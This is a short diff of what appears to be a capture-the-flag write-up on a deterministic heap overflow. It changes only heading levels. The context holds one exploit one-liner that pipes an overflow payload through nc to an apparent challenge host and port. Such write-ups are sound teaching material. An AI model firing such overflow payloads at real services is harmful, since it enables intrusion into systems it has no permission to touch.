@@ -107,7 +107,7 @@ During a run with overflow, the random is overwritten with the given input.
 
 ![](screenshots/4.png)
 
-## Exploit
+# Exploit
 
 The allocated heap structure is deterministic, always allocating the same size in the same order.
 
@@ -122,11 +122,11 @@ python -c 'print("A"*32+"X"*31+"\n"+"X"*31+"\n")' | nc 10.10.8.10 55364
 
 TODO: replace screenshot from live environment
 
-## Flag
+# Flag
 
 TODO: add flag from live env
 
-## Pwndbg
+# Pwndbg
 
 Pwndbg can be used for better experience.
 
